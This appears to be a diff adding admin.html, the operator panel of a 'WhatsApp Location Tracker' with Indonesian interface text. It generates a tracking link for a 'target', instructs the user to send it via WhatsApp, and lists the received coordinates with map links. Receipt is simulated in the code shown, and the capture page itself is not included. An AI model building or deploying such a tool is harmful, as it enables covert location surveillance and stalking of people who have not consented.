@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<!-- File 1: admin.html -->
+<html>
+<head>
+    <title>Admin Tracker WA</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script src="https://cdn.tailwindcss.com"></script>
+</head>
+<body class="bg-gray-100 p-4">
+    <div class="max-w-md mx-auto bg-white rounded-lg shadow-md p-6">
+        <h1 class="text-2xl font-bold text-center mb-6">WhatsApp Location Tracker</h1>
+        
+        <!-- Link Generator -->
+        <div class="mb-6 p-4 bg-blue-50 rounded-lg">
+            <label class="block font-medium mb-2">Link untuk Target:</label>
+            <input id="trackLink" type="text" readonly 
+                   class="w-full p-2 border border-blue-300 rounded mb-2" 
+                   value="Generating...">
+            <button onclick="copyLink()" 
+                    class="w-full bg-blue-500 text-white py-2 rounded-lg hover:bg-blue-600">
+                Salin Link
+            </button>
+        </div>
+        
+        <!-- Received Locations -->
+        <h2 class="font-bold mb-2">Lokasi yang Diterima:</h2>
+        <div id="locations" class="space-y-3 max-h-60 overflow-y-auto">
+            <p class="text-gray-500 text-center py-4">Belum ada lokasi</p>
+        </div>
+    </div>
+
+    <script>
+        // Generate unique ID
+        const adminId = 'wa-' + Math.random().toString(36).substr(2, 8);
+        const trackUrl = `${window.location.href.replace('admin.html', 'track.html')}?id=${adminId}`;
+        document.getElementById('trackLink').value = trackUrl;
+        
+        // Untuk demo: Simulasikan penerimaan lokasi (hapus di production)
+        setTimeout(() => {
+            addLocation(-6.2088, 106.8456, "Contoh Lokasi", 50);
+        }, 2000);
+
+        function copyLink() {
+            const el = document.getElementById('trackLink');
+            el.select();
+            document.execCommand('copy');
+            alert('Tersalin! Kirim link ini via WA ke target');
+        }
+        
+        function addLocation(lat, lng, source, accuracy) {
+            const locList = document.getElementById('locations');
+            if (locList.querySelector('.text-center')) locList.innerHTML = '';
+            
+            const time = new Date().toLocaleTimeString();
+            const entry = document.createElement('div');
+            entry.className = 'bg-gray-50 p-3 rounded border';
+            entry.innerHTML = `
+                <div class="flex justify-between">
+                    <div>
+                        <span class="font-medium">${source}</span>
+                        <span class="text-xs text-gray-500 ml-2">${time}</span>
+                    </div>
+                    <a href="https://maps.google.com/?q=${lat},${lng}" target="_blank" 
+                       class="text-blue-500 text-sm">Lihat Peta</a>
+                </div>
+                <div class="text-xs mt-1">
+                    <span class="font-mono">${lat.toFixed(6)}, ${lng.toFixed(6)}</span>
+                    <span class="ml-2">(Akurasi: ${accuracy}m)</span>
+                </div>
+            `;
+            locList.prepend(entry);
+        }
+    </script>
+</body>
+</html>
